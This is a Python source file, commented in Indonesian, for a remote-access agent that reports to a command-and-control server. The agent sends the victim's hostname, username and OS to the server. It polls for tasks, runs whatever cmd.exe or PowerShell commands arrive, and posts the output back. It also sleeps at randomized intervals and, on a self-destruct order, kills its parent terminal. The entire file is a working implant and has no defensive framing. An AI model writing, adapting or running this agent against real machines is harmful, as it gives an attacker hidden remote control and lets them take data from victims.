import requests
import subprocess
import time
import random
import socket
import getpass
import platform
import sys
import os
try:
    import psutil # Coba impor psutil
except ImportError:
    psutil = None # Jika tidak ada, set ke None

# --- KONFIGURASI ---
C2_URL = "http://192.168.1.100:5000"
AGENT_ID = None

# --- Fungsi register_agent, get_task, execute_task, send_results (Tidak ada perubahan) ---
def register_agent():
    global AGENT_ID
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = f"{platform.system()} {platform.release()}"
    payload = {"hostname": hostname, "username": username, "os": os_info}
    try:
        response = requests.post(f"{C2_URL}/api/register", json=payload, timeout=5)
        response.raise_for_status()
        data = response.json()
        AGENT_ID = data.get("agent_id")
        print(f"[+] Berhasil mendaftar. Agent ID: {AGENT_ID}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal terhubung ke C2: {e}")
        AGENT_ID = None

def get_task():
    if not AGENT_ID: return None
    try:
        url = f"{C2_URL}/api/tasks/{AGENT_ID}"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengambil tugas: {e}")
        return None

def execute_task(task):
    tool = task.get("tool")
    command = task.get("command")
    if tool not in ["cmd.exe", "powershell"]:
        return "Error: Tool tidak didukung."
    try:
        if tool == "cmd.exe": full_command = [tool, "/c", command]
        else: full_command = [tool, "-Command", command]
        result = subprocess.run(full_command, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else ""
        output += result.stderr if result.stderr else ""
        return output if output else "Perintah dieksekusi tanpa output."
    except Exception as e:
        return f"Error saat eksekusi: {str(e)}"

def send_results(task_id, output):
    if not AGENT_ID or task_id == "none": return
    payload = {"task_id": task_id, "output": output}
    try:
        url = f"{C2_URL}/api/results"
        requests.post(url, json=payload, timeout=5)
        print(f"[+] Hasil untuk Task ID {task_id} berhasil dikirim.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengirim hasil: {e}")

def main_loop():
    """Loop utama untuk operasional agent."""
    register_agent()

    while True:
        if not AGENT_ID:
            print("[!] Pendaftaran gagal. Mencoba lagi dalam 60 detik...")
            time.sleep(60)
            register_agent()
            continue

        task = get_task()

        if task:
            task_id = task.get("task_id")
            command = task.get("command")
            tool = task.get("tool")

            # --- BLOK LOGIKA TERMINATE YANG DISEMPURNAKAN ---
            if tool == "internal" and command == "self-destruct":
                print("[!] Menerima perintah terminate. Menutup terminal induk dan keluar.")
                send_results(task_id, "Agent terminated successfully. Parent terminal closure attempted.")
                
                if psutil:
                    try:
                        current_process = psutil.Process(os.getpid())
                        parent_process = current_process.parent()
                        
                        # Cek apakah induknya adalah cmd.exe atau powershell.exe
                        if parent_process.name().lower() in ["cmd.exe", "powershell.exe"]:
                            print(f"[*] Menemukan proses induk: {parent_process.name()} (PID: {parent_process.pid})")
                            parent_process.kill() # Mengirim sinyal kill ke proses induk
                            print("[+] Perintah kill ke terminal induk telah dikirim.")
                    except psutil.Error as e:
                        print(f"[!] Gagal menghentikan terminal induk: {e}")
                
                sys.exit(0) # Agent tetap keluar meskipun gagal mematikan induknya

            if command == "sleep":
                sleep_duration = task.get("duration", 30)
                print(f"[*] Tidak ada tugas. Tidur selama {sleep_duration} detik.")
                time.sleep(sleep_duration)
            else:
                print(f"[*] Menerima tugas baru: {command}")
                output = execute_task(task)
                send_results(task_id, output)
                time.sleep(random.randint(5, 10))
        else:
            time.sleep(30)

if __name__ == "__main__":
    if psutil is None:
        print("[WARNING] Modul 'psutil' tidak ditemukan. Fitur penutupan terminal otomatis tidak akan berfungsi.")
        print("[INFO] Silakan instal dengan: pip install psutil")
    main_loop()
